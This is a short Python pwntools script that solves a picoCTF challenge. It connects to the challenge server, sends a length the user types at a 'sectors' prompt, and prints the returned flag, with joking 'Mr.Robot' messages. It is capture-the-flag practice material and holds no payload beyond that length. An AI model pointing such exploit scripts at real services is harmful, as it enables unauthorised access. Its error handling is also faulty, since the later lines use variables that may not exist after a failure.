

from pwn import *

context.log_level = 'critical'

host,port = "saturn.picoctf.net", 51044

print("Mr.Robot: Of course I can get the flag for you!")
length=input("Mr.Robot: Just tell me the length: \n> ")

try:
    s = remote(host,port)
    s.recvuntil(b"sectors:")
    s.sendline(bytes(length,"latin-1"))
    s.recvuntil(b"work!")
    flag=s.recv().decode('utf-8')
except:
    print("Mr.Robot: Oh no! Something went wrong... :-(")

s.close()

print("Mr.Robot: I know - I'am awesome... here is the flag!")

print("\t" + flag.strip())  